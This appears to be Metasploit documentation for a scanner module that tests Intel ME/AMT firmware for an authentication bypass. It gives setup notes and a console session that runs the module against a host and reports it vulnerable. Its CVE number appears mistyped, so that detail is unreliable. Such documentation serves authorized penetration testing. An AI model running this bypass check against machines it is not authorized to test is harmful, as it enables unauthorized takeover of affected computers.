## Vulnerable Application

This module exploits vulnerable versions of the Intel Management Engine (ME) firmware present Intel Core CPU 1st through 7th generations that allows authentication bypass and full control over the target machine, if the Active Management Technology feature is enabled and networking is configured.

**Vulnerable Application Installation Steps**

Enable the feature in the firmware setup screen on any vulnerable target machine. The module has been tested on HP and Lenovo desktops and laptops.

## Verification Steps

A successful run of the module will look like this:


```
msf auxiliary(telnet_version) > use auxiliary/scanner/http/intel_amt_digest_bypass
msf auxiliary(intel_amt_digest_bypass) > show options

Module options (auxiliary/scanner/http/intel_amt_digest_bypass):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    16992            yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(intel_amt_digest_bypass) > set rhosts 192.168.1.18
rhosts => 192.168.1.18
msf auxiliary(intel_amt_digest_bypass) > run

[+] 192.168.1.18:16992 - Vulnerable to CVE-2017-5869 {"Computer model"=>"30A70051US", "Manufacturer"=>"LENOVO", "Version"=>"A4KT80AUS", "Serial number"=>"                    ", "System ID"=>"XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX", "Product name"=>"To be filled by O.E.M.", "Asset tag"=>"                         ", "Replaceable?"=>"Yes", "Vendor"=>"LENOVO", "Release date"=>"09/23/2015"}
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
